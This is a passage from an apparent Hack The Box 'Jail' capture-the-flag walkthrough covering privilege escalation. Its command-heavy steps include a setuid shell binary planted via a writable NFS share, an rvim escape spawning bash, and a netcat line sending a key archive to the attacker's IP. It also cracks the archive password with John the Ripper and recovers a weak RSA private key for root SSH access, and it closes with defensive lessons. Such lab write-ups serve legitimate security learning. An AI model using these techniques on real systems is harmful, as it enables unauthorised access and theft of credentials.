    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

This is similar to the program we used for the [TartarSauce box](https://medium.com/@ranakhalil101/hack-the-box-tartarsauce-writeup-w-o-metasploit-e73393d4a0cd). Then compile the program.

```text
gcc setuid.c -o setuid
```

Set the setuid bit on the file.

```text
chmod u+s setuid
```

Confirm the permissions on the file.

```text
$ ls -la setuid
-rwsr-xr-x 1 frank 1000 16664 Mar 11  2020 setuid
```

Perfect, frank is the owner and the setuid bit is set.

Going back to the target machine, execute the program.

```text
bash-4.2$ /var/nfsshare/setuid
/var/nfsshare/setuid
[frank@localhost home]$ whoami
whoami
frank
```

We pivoted to the frank user! Grab the _user.txt_ flag.

![](https://miro.medium.com/max/727/1*1rar36iOOMTWNld6U6GF_Q.png)

### frank -&gt; adm <a id="4a54"></a>

View the list of allowed sudo commands the user frank can run.

![](https://miro.medium.com/max/1117/1*yKI7KtmqvHok6wpoK53-ew.png)

We can run one command as the adm user. Let’s test it out.

```text
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

We enter an rvim shell displaying the jail.c file. We need to figure out a way to escape the shell.

Attempt \#1.

```text
:!/bin/sh
```

We get the following error.

```text
E145: Shell commands not allowed in rvim4,1Top
```

Attempt \#2.

```text
:set shell=/bin/sh
:shell
```

Same error.

Attempt \#3.

```text
:py import pty; pty.spawn("/bin/bash")
```

It works! We pivoted to the user adm.

```text
bash-4.2$ whoami
whoami
adm
```

### adm -&gt; root <a id="4d79"></a>

Let’s view the content of the _adm_ directory.

```text
bash-4.2$ ls -la
ls -la
total 4
drwxr-x---.  3 root adm    19 Jul  3  2017 .
drwxr-xr-x. 23 root root 4096 Mar 10 17:58 ..
drwxr-x---.  3 root adm    52 Jul  3  2017 .keys
```

View the content of the _.keys_ directory.

```text
bash-4.2$ ls -la
ls -la
total 8
drwxr-x---. 3 root adm  52 Jul  3  2017 .
drwxr-x---. 3 root adm  19 Jul  3  2017 ..
-rw-r-----. 1 root adm 475 Jul  3  2017 keys.rar
drwxr-x---. 2 root adm  20 Jul  3  2017 .local
-rw-r-----. 1 root adm 154 Jul  3  2017 note.txt
```

View the content of _note.txt_.

```text
bash-4.2$ cat note.txt
cat note.txt
Note from Administrator:
Frank, for the last time, your password for anything encrypted must be your last name followed by a 4 digit number and a symbol.
```

I’m guessing the RAR file is password encrypted and the password is frank’s last name followed by 4 digits and a symbol as stated in the note.

Next, view the content of the _.local_ directory.

```text
bash-4.2$ ls -la
ls -la
total 4
drwxr-x---. 2 root adm  20 Jul  3  2017 .
drwxr-x---. 3 root adm  52 Jul  3  2017 ..
-rw-r-----. 1 root adm 113 Jul  3  2017 .frank
bash-4.2$ cat .frank
cat .frank
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
```

The _.frank_ file contains cipher text. I tested to see if it is encrypted using a shift cipher, but it’s not. Next, we’ll test it out on a tool called [quipquip](https://quipqiup.com/) that automatically tests a bunch of ciphers.

We get a hit back!

```text
Hahaha! Nobody will quess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!
```

After googling “Alcatraz escape”, I have a pretty good idea on what the password could be. One of the escaped prisoners is called Frank Morris. Since frank was a user on this box, and the escape was in 1962, I’m going to guess that the password is _Morris1962!_. And I just got why the box is called Jail!

Let’s transfer the _keys.rar_ file back to our attack machine. To do that, check if netcat is installed on the box.

```text
bash-4.2$ find / -name nc 2>/dev/null
find / -name nc 2>/dev/null
/usr/bin/nc
```

It is. On the attack machine, setup a listener to receive the file.

```text
nc -l -p 1234 > key.rar
```

On the target machine, send the file to the attack machine.

```text
nc 10.10.14.45 1234 < keys.rar
```

It doesn’t seem to be connecting to my attack machine. Maybe it’s a firewall issue. Let’s transfer it in a different way. Base64 encode the file.

```text
bash-4.2$ cat keys.rar | base64
cat keys.rar | base64
UmFyIRoHAM+QcwAADQAAAAAAAAALnXQkhEAAgAEAAMMBAAAD7rRLW0tk40odMxgApIEAAHJvb3RhdXRob3JpemVkc3Noa2V5LnB1YnI+qg+QiYZnpO86O3+rX46ki9CMd7+qCC09p9xDL5gF8Wgwc7mZK9wkiTpvXO4vmmM50barFVJi55jD3l9J8var5iMCb8+Lrpn2e79rXFKzktBJ2e3/cSLUZRSv33cQFk2+9b43PDDjUD6IQ6FVbjc72sy6/8bMu7k8MYtJWFRHsLTwIXi0ZMrd/vydVFq7vQiUPYbt7H0SscXY4crEf9ann9iQyl6V034tluMZ9VQ6DmkXk53ekSbb3/Ck5/1hb9qj2RpBQUNTW70fQIbDXjcOp+qKerl8cfpDdo7JDRZbmJBuYd5zgFEASKHrew3spqQ/gZrNO6m/VvI/ZUa6DTmqhguHYKC838c9JzzDmW52daeuPMZtdTz2B0Enz5eBdV2XLbofx6ZA3nIYco6DJMvU9NxOfaLgnTj/JWRVAgUjoEgQUdcyWDEWoDYh+ARbAfG+qyqRhF8ujgUqYWNbXY8FxMsrTPdcWGz8348OZsMWH9NS5S8/KeIoGZU1YhfpP/6so4ihWCnWxD17AEAHAA==
```

Then in the attack machine, base64 decode it and save it in the file _keys.rar_.

```text
echo -n “UmFyIRoHAM+QcwAADQAAAAAAAAALnXQkhEAAgAEAAMMBAAAD7rRLW0tk40odMxgApIEAAHJvb3RhdXRob3JpemVkc3Noa2V5LnB1YnI+qg+QiYZnpO86O3+rX46ki9CMd7+qCC09p9xDL5gF8Wgwc7mZK9wkiTpvXO4vmmM50barFVJi55jD3l9J8var5iMCb8+Lrpn2e79rXFKzktBJ2e3/cSLUZRSv33cQFk2+9b43PDDjUD6IQ6FVbjc72sy6/8bMu7k8MYtJWFRHsLTwIXi0ZMrd/vydVFq7vQiUPYbt7H0SscXY4crEf9ann9iQyl6V034tluMZ9VQ6DmkXk53ekSbb3/Ck5/1hb9qj2RpBQUNTW70fQIbDXjcOp+qKerl8cfpDdo7JDRZbmJBuYd5zgFEASKHrew3spqQ/gZrNO6m/VvI/ZUa6DTmqhguHYKC838c9JzzDmW52daeuPMZtdTz2B0Enz5eBdV2XLbofx6ZA3nIYco6DJMvU9NxOfaLgnTj/JWRVAgUjoEgQUdcyWDEWoDYh+ARbAfG+qyqRhF8ujgUqYWNbXY8FxMsrTPdcWGz8348OZsMWH9NS5S8/KeIoGZU1YhfpP/6so4ihWCnWxD17AEAHAA==” | base64 -d > keys.rar
```

Now decompress the file with the password we guessed.

```text
unrar x keys.rar
```

We get a success message and it decompresses the file.

```text
root@kali:~/Desktop/htb/jail/adm# ls -la
total 16
drwxr-xr-x 2 root root 4096 Mar 11 14:32 .
drwxr-xr-x 8 root root 4096 Mar 11 14:20 ..
-rw-r--r-- 1 root root  475 Mar 11 14:30 keys.rar
-rw-r--r-- 1 root root  451 Jul  3  2017 rootauthorizedsshkey.pub
```

We get a root public key. Before we try to crack it, let’s assume we didn’t get the hints about the password. In that case, you would hash the _keys.rar_ file to a John the Ripper \(JtR\) acceptable format.

```text
rar2john keys.rar
```

Save the hash in a _hash.txt_ file.

```text
keys.rar:$RAR3$*1*723eaa0f90898667*eeb44b5b*384*451*1*a4ef3a3b7fab5f8ea48bd08c77bfaa082d3da7dc432f9805f1683073b9992bdc24893a6f5cee2f9a6339d1b6ab155262e798c3de5f49f2f6abe623026fcf8bae99f67bbf6b5c52b392d049d9edff7122d46514afdf7710164dbef5be373c30e3503e8843a1556e373bdaccbaffc6ccbbb93c318b49585447b0b4f02178b464caddfefc9d545abbbd08943d86edec7d12b1c5d8e1cac47fd6a79fd890ca5e95d37e2d96e319f5543a0e6917939dde9126dbdff0a4e7fd616fdaa3d91a414143535bbd1f4086c35e370ea7ea8a7ab97c71fa43768ec90d165b98906e61de7380510048a1eb7b0deca6a43f819acd3ba9bf56f23f6546ba0d39aa860b8760a0bcdfc73d273cc3996e7675a7ae3cc66d753cf6074127cf9781755d972dba1fc7a640de7218728e8324cbd4f4dc4e7da2e09d38ff256455020523a0481051d732583116a03621f8045b01f1beab2a91845f2e8e052a61635b5d8f05c4cb2b4cf75c586cfcdf8f0e66c3161fd352e52f3f29e2281995356217e93ffeaca388a15829d6*33:1::rootauthorizedsshkey.pub
```

Then try to crack it using JtR.

```text
john --format=rar --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Alright, moving on. We found the following public key.

```text
root@kali:~/Desktop/htb/jail/adm# cat rootauthorizedsshkey.pub 
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
YPH4Clvxj/41tzMVp/O3PCRVkDK/CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//
DmcIo1pJGKy8LDrwdpsSjVmvSgg39nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6Pd
D/qlaFM8B87MHZlW1fqe6QKBgQVY7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/w
Wt2/7A1Xgi5ckTFMG5EXhfv67GfCFE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAx
I85LArqOGc6QoVPS7jx5h5bK/3Oqm3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFug
a99GCw==
-----END PUBLIC KEY-----
```

We’ll use the [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) to try and recover the private key.

```text
./RsaCtfTool.py --publickey /root/Desktop/htb/jail/adm/rootauthorizedsshkey.pub --private > id_root
```

It cracks the private key! Change the permissions on the file.

```text
chmod 400 id_root
```

SSH into the root account.

```text
root@kali:~/Desktop/htb/jail/adm# ssh -i id_root root@10.10.10.34
[root@localhost ~]#
```

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/719/1*H69dvaiir_5ujZGTFUdrBA.png)

## Lessons Learned <a id="c6a8"></a>

To gain an initial foothold on the box we exploited one vulnerability.

1. Buffer overflow vulnerability. The Jail service being used was vulnerable to a stack buffer overflow. This allowed us to execute shell code and gain access to the box. The root cause of the buffer overflow vulnerability was lack of input validation. The developer should have validated user input.

To escalate privileges we exploited four vulnerabilities.

1. Security misconfiguration of NFS shares. The NFS shares were readable and writeable. Therefore, as a remote attacker, we were able to mount shares and add malicious files to the shares that allowed us to pivot to another user \(frank\). The configuration of NFS shares should have followed the least privilege policy.
2. Security misconfiguration of user permissions. The user we pivoted to was configured to run the rvim command as another user. We used that security misconfiguration to run the command, escape the rvim shell and pivot that user \(adm\). Similar to NFS shares, the user permissions should have followed the least privilege policy.
3. Weak credentials. Now that we have access to another user’s directory, we enumerate the user’s files and find a RAR file that was encrypted with the user’s personal information and therefore was easy to crack. The user should have instead used a sufficiently long password that is difficult to crack.
4. Weak cryptographic key. After decrypting the RAR file, we found a weak RSA public key to the root’s account. From there we used a tool to recover the corresponding private key and SSHed into the root account. The issue here is not with the RSA algorithm but the parameter that the administrator had used as input to the RSA algorithm. For example, small key sizes, using smaller primes \(p & q values\), etc. The administrator should have used the guidelines listed in cryptographic standards that ensure secure configuration of the cryptographic algorithm results in strong keys.

